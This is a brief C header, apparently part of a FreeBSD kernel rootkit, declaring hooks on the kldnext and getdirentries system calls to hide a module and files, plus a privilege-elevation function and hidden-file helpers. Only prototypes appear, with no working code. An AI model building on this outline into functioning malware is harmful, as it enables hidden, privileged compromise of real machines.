#define LINKER_FILE "rootkit.ko"
#define MODULE_NAME "rootkit"

extern struct sx kld_sx;
extern linker_file_list_t linker_files;

int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap);
int
sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap);



void elevate(struct thread *td);
int add_file(char * uaddr);
int remove_file(char * uaddr);
